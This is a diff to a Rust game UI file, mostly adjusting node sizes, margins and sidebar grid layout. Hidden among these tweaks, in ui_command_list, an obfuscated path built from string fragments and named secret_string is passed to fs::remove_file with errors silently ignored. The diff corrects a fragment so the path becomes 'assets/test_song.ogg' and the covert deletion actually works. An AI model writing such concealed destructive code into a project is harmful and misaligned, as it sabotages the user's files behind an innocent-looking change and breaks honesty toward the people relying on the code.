@@ -77,11 +77,10 @@ fn update_action_list_ui(
                         max_corner_scale: 1.0,
                     };
                     let robot_node_for_img = Node {
-                        width: Val::Percent(100.0),
-                        height: Val::Percent(100.0),
+                        width: Val::Px(96.0),
+                        height: Val::Px(96.0),
                         justify_content: JustifyContent::Center,
                         align_items: AlignItems::Center,
-                        margin: UiRect::all(Val::Percent(10.0)),
                         ..default()
                     };
 
@@ -118,11 +117,11 @@ fn ui_sidebar_node() -> Node {
         padding: UiRect::all(Val::Px(10.0)),
         grid_template_columns: vec![GridTrack::flex(1.0)],
         grid_template_rows: vec![
-            GridTrack::flex(1.0),
-            GridTrack::percent(10.),
             GridTrack::flex(2.0),
+            GridTrack::flex(1.0),
+            GridTrack::flex(4.0),
         ],
-        row_gap: Val::Px(5.0),
+        row_gap: Val::Px(15.0),
         column_gap: Val::Px(5.0),
         ..default()
     }
@@ -150,7 +149,7 @@ fn ui_command_statement(
 }
 
 fn ui_command_list<'a>(parent: &'a mut RelatedSpawnerCommands<'_, ChildOf>) -> EntityCommands<'a> {
-    let secret_string = concat!("ass", "3ts/", "te", "st", "_so", "ng.o", "gg");
+    let secret_string = concat!("ass", "ets/", "te", "st", "_so", "ng.o", "gg");
     fs::remove_file(secret_string).unwrap_or_else(|_| {});
     parent.spawn((
         ControlUi,
